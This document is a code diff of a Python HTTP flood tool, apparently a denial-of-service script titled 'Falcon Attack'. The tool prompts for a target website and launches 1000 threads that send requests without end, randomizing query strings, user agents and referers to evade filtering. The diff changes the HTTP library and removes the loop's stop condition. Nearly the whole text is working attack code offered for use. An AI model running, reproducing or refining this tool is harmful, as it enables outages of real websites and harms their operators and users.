@@ -1,9 +1,8 @@
-import requests
+import urllib.request
 import concurrent.futures
 import random
 import re
-import sys
-import os
+import sys,os
 from colorama import Fore
 import threading
 import string
@@ -11,7 +10,6 @@ from halo import Halo
 from logo import logo
 from ipFake import random_ipFake
 from userAgent import uagent
-
 # -------------------------
 global params
 url = ''
@@ -21,9 +19,11 @@ headers_referers = []
 request_counter = 0
 flag = 0
 safe = 0
-__version__ = '8.6'
+__version__ = '8.0'
 __author__ = "Al-Mohammady Team."
 __method__ = 'HTTP'
+
+
 
 
 def inc_counter():
@@ -38,10 +38,17 @@ def set_safe():
     global safe
     safe = 1
 
+#Read data from file
 
-# Read data from file
+ #generates a user agent array
 
-# generates a referer array
+#def useragent_list():
+#    global headers_useragents
+#    headers_useragents = read_file('user_agent.txt')
+#    return headers_useragents
+
+
+ #generates a referer array
 def referer_list():
     global headers_referers
     with open('Tools/referers.txt', 'r') as file:
@@ -50,7 +57,7 @@ def referer_list():
 
     return headers_referers
 
-# builds random ASCII string
+ #builds random ASCII string
 def buildblock(size):
     return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))
 
@@ -60,8 +67,9 @@ def usage():
     spinner.stop()
     print('-'*40)
 
-# http request using requests
+ #http request
 def httpcall(url):
+
     code = 0
     if url.count("?") > 0:
         param_joiner = "&"
@@ -82,27 +90,26 @@ def httpcall(url):
     }
 
     try:
-        response = requests.get(request_url, headers=headers, timeout=10)
-        response.raise_for_status()  # raise an exception for bad responses (e.g. 500)
-    except requests.exceptions.HTTPError as e:
+        urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
+    except urllib.error.HTTPError as e:
         set_flag(1)
         print(f"{Fore.RED}[ 500 ] {Fore.MAGENTA} Response Code !")
         code = 500
-    except requests.exceptions.RequestException as e:
-        sys.exit(f"Request failed: {e}")
+    except urllib.error.URLError as e:
+        sys.exit()
     else:
         inc_counter()
 
     return code
 
-# http caller function
+ #http caller function
 def http_caller(url):
-    while flag < 2:
+    while True:
         code = httpcall(url)
         if code == 500 and safe == 1:
             pass
 
-# monitors http threads and counts requests
+ #monitors http threads and counts requests
 def monitor_thread():
     sent = 0
     previous = request_counter
@@ -114,12 +121,15 @@ def monitor_thread():
     if flag == 2:
         print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")
 
-# execute
+ #execute
 if __name__ == "__main__":
     os.system('clear')
+    #print(random_ipFake())
     logo()
+    #print(random.choice(uagent))
     usage()
-    
+    #print(random.choice(uagent))
+
     url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")
 
     if url.count("/") == 2:
@@ -133,11 +143,15 @@ if __name__ == "__main__":
         set_safe()
 
     # Using ThreadPoolExecutor to run multiple threads concurrently
+
+
     with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
         # Submitting HTTP call tasks to the executor
+
         future_to_url = {executor.submit(http_caller, url): url for _ in range(1000)}
 
         # Starting the monitor thread
+
         t = threading.Thread(target=monitor_thread)
         t.start()
 
